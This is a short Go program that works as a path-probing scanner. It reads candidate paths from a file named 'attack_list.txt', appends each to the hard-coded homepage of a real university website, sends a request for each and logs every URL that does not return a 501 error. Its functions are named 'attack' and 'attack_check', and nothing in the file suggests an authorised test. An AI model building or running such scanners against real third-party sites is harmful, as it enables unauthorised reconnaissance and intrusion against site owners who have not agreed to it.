package main

import (
	"net/http"
	"io/ioutil"
	"fmt"
	"os"
	"bufio"
	"io"
	"strings"
)

func main() {
	url := "http://www.ritsumei.ac.jp/"


	f, _ := os.Open( "attack_list.txt" )
	file, _ := os.OpenFile("attack_url.txt", os.O_WRONLY|os.O_CREATE, 0666)
	defer file.Close()
	defer f.Close()

	reader := bufio.NewReaderSize( f, 4096 )

	for {
		line, _, err := reader.ReadLine()
		
		if err == io.EOF {
			break
		}

		attack_key := strings.Replace( string( line ), " \n", "", -1 )
		attack_point := url + attack_key
		result := attack( attack_point )
		fmt.Println( attack_key )

		if attack_check( result ) {
			fmt.Fprintln( file, attack_point )
		}
	}
}

func attack( url string ) string {
	req, _ := http.NewRequest( "Get", url, nil )

	client := new( http.Client )
	resp, err := client.Do( req )

	if resp != nil {
		defer resp.Body.Close()
		var byteArray, _ = ioutil.ReadAll( resp.Body )
		return string( byteArray )
	} else {
		return err.Error()
	}
}

func attack_check( html string ) bool {
	re_split := strings.Split( html, "\n" )

	if ( len( re_split ) >= 3 ) && re_split[2] == "<title>501 Method Not Implemented</title>" {
		return false
	}
	
	return true
}

